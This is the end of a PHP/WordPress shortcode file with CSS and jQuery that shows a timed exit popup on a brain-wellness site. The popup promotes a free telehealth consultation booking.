button.close:focus, button.close:hover { border: none; color: #f69751; opacity: 1 !important; }

.bookfreebtn { margin-top: 25px;  display: inline-block; }
.bookfreebtn .btn-book  { display: inline-block; vertical-align: middle; width: 138px; padding: 10px; text-align: center; font-size: 23px;line-height: normal; color: #9f9f9f; background: #e2e2e2;border-radius: 10px; transition: all ease .4s; font-family: 'Montserrat', sans-serif;margin-right: 5px;cursor: pointer;     font-weight: 700;}
.bookfreebtn .btn-book:last-child{ margin-right: 0; }
.bookfreebtn .btn-book span { font-size: 9px; display: block; font-weight: normal }
.bookfreebtn .btn-book.orgbtn{ background: #f69751; color: #fff; }
.bookfreebtn .btn-book:hover { text-decoration: none; background: #f69751; color: #fff; }
.bookfreebtn .btn-book.orgbtn:hover{ background: #e2e2e2; color: #9f9f9f; }
.popupleftbx { background-size: cover !important; background: url(/bookings3/images/exitpopup_bgimg.jpg) no-repeat; }
.exitpopup_cntbxpop{ text-align: center; color: #fff; padding: 50px 50px; font-family: 'Montserrat', sans-serif; }
.exitpopup_cntbxpop h2 { color: #fff; font-family: 'Montserrat', sans-serif;font-size:48px; line-height: 55px; font-weight: 700; margin: 0 }
.exitpopup_cntbxpop p { color: #fff; font-size: 15px; line-height: 23px; font-family: 'Montserrat', sans-serif; }
.book_freebxpop span > span {color: #f69751; font-size: 25px; line-height: 30px; font-weight: bold}
.book_freebxpop p { font-size: 17px; line-height: 21px; }
.popuprightbx { position: relative; background: #005caa }
.popuprightbx:before { content: "";position: absolute; left: 2px; top: 0; background: url('https://brainwellnessspa.com.au/bookings3/images/exitpopupbg-curvimg.png') no-repeat; width:35px; height: 100%; background-size: cover; }
.popuprightbx img { width: 100%; }
.popupterriimgcnt { position: absolute; right: 0; bottom: 10px; background: #005caa; color: #fff; text-align: center; padding: 7px 18px; }
.popupterriimgcnt h5 { font-weight: bold;font-size: 16px; line-height: 20px; margin: 0; color: #fff; font-family: 'Montserrat', sans-serif; }
.popupterriimgcnt span { font-size: 11px; line-height: 17px; display:block; vertical-align: top; text-align: right;font-family: 'Montserrat', sans-serif; font-weight:  400;  font-family: 'Montserrat', sans-serif;   }

.popupterriimgcnt p { color: #fff; font-size: 11px;line-height: 16px; margin: 0; padding: 0; text-align: right;font-family: 'Montserrat', sans-serif; }
.exitmodelpopup .modal-body { padding:0 !important}
.exitmodelpopup { padding: 0; height: auto; background: transparent; }

@media(max-width: 1024px){
.popup .closePopupCross{ top: 0; right: -16px; line-height: 12px }
}
@media(max-width: 767px){
.exitmodelpopup { width: 90%; }	
.exitpopup_cntbxpop { padding: 50px 10px;  }
.exitpopup_cntbxpop h2 { font-size: 30px; line-height: 35px; }   
.bookfreebtn { margin: 10px 0; }
.bookfreebtn .btn-book { width: auto }
}
@media(max-width: 575px){
.exitpopup_cntbxpop {  padding: 14px 6px;}
.exitpopup_cntbxpop h2 { font-size: 25px; line-height: 30px; }
.exitpopup_cntbxpop p { margin-bottom: 0; font-size: 13px; line-height: 24px; margin-bottom: 5px; }	
.book_freebxpop p { font-size: 14px; line-height: 20px;}
.book_freebxpop span > span  { font-size: 15px; line-height: 22px; }
.bookfreebtn { margin: 2px 0 0;}

.bookfreebtn .btn-book { padding: 5px; font-size: 19px; width: 95px; margin-bottom: 5px; }
.bookfreebtn .btn-book:last-child{ margin-bottom: 0; }
.exitmodelpopup::-webkit-scrollbar { width: 12px; } 
.exitmodelpopup::-webkit-scrollbar-track { -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.3); }
.exitmodelpopup::-webkit-scrollbar-thumb { background-color: darkgrey; outline: 1px solid slategrey; }
}
@media(max-width: 430px){
.popuprightbx { background: url('https://brainwellnessspa.com.au/bookings3/images/exitpopupterriimg.png') no-repeat; background-size: cover !important; background-position: center top !important }	
.popuprightbx:before { left: -1px; }
.popupterriimgcnt{ padding: 7px 9px; }
}
@media(max-width: 420px){
.exitpopup_cntbxpop { padding: 14px 0; }	
.exitpopup_cntbxpop p {font-size: 12px;line-height: 19px;}
.book_freebxpop p { font-size: 12px; line-height: 19px; }
.popuprightbx img { display: none; }
.popuprightbx:before { background-position: left top; left: 0px; }
.popupterriimgcnt{padding: 7px 4px}
.exitmodelpopup {  width: 88%;}


}
@media(max-width: 375px){
.popupterriimgcnt h5 { font-size: 13px; line-height: 16px; }
.popupterriimgcnt p {font-size: 9px; line-height: 14px}
.popuprightbx:before { left: -1px;  }
}
@media(max-width: 343px){ 
.exitpopup_cntbxpop h2 { font-size: 20px; line-height: 25px; }
.exitpopup_cntbxpop p { font-size: 10px; line-height: 16px; }
.bookfreebtn .btn-book span  { font-size: 8px; }
.popupterriimgcnt p { font-size: 8px; }
}

/*css end editpopup*/
</style>
<script>
    
jQuery(document).ready(function() {
	
    
        jQuery('body').prepend('<div id="ouibounce-modal"><div class="overlay"></div><div class="popup exitmodelpopup"> <a class="closePopupCross">×</a><div class="modal-content"><div class="modal-body p-0"><div class="row row-no-gutters"><div class="col-lg-7 col-md-7 col-sm-6 col-6 p-0 popupleftbx"><div class="exitpopup_cntbxpop"><h2>NEED HELP</h2><p>to Improve Your Well-Being and Reclaim Your Quality of Life?</p><div class="book_freebxpop"> <span>Book a <span>25 Mins FREE</span> </span><p>Telehealth Consultation with Terri Bowman</p></div><div class="bookfreebtn"><a href="https://brainwellnessspa.zohobookings.com.au/#/customer/1597000000035035" class="btn-book orgbtn" target="_blank">Yes<span>I need to change my life </span></a><a class="btn-book" id="closeLeavePage">No<span>I m in perfect health </span></a></div></div></div><div class="col-lg-5 col-md-5 col-sm-6 col-6 p-0 popuprightbx"> <img src="https://brainwellnessspa.com.au/bookings3/images/exitpopupterriimg.png" alt=""class="desktopimgpop" /><div class="popupterriimgcnt"><h5>Terri Bowman</h5> <span>Director and</span><p> Creator of Positive <br /> Auditory Stimuli Technique</p></div></div></div></div></div></div></div>');

        jQuery('.closePopupLink, #closeLeavePage, .overlay , .closePopupCross').click(function() {
            jQuery('.overlay, .popup').fadeOut(500);
        });
  
        
  
        /*var _ouibounce = ouibounce(document.getElementById('ouibounce-modal'), {
        	aggressive: true,
        	timer: 0,
        	callback: function() { console.log('ouibounce fired!'); }
      	});*/

      	/*juts uncomment this line after setting the image*/
      	jQuery('#ouibounce-modal').delay(20000).fadeIn('slow');
});

</script>
<?php 
 }
}
// Register shortcode
add_shortcode('global_popup', 'popup_modal_global');
		
		
?>